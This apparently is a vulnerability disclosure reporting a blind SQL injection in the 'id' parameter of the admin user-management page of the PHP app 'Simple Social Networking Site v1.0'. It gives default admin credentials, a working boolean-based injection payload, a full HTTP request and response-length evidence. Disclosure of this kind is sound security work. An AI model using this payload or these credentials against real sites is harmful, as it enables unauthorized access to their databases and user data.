# Simple Social Networking Site v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Vulnerability File: /sns/admin/?page=user/manage_user&id=

Vulnerability location: /sns/admin/?page=user/manage_user&id=,id

[+] Payload: /sns/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=6--+ // Leak place ---> id

Current database name: sns_db,length is 6

```sql
GET /sns/admin/?page=user/manage_user&id=3%27%20and%20length(database())%20=6--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 5, Content-Length: 25820

![image](https://user-images.githubusercontent.com/54017627/166929711-e33618b9-0572-41dd-8f5c-dadd416e5d02.png)

![image](https://user-images.githubusercontent.com/54017627/166929597-91cbdd95-35c1-479e-95cf-87db0598869b.png)

When length (database ()) = 6, Content-Length: 25789

![image](https://user-images.githubusercontent.com/54017627/166929657-89f09dae-0f0a-4c74-9c6d-8e7fee1a6693.png)

![image](https://user-images.githubusercontent.com/54017627/166929540-1c98944d-6bfd-433a-a094-2debd87e2cb0.png)
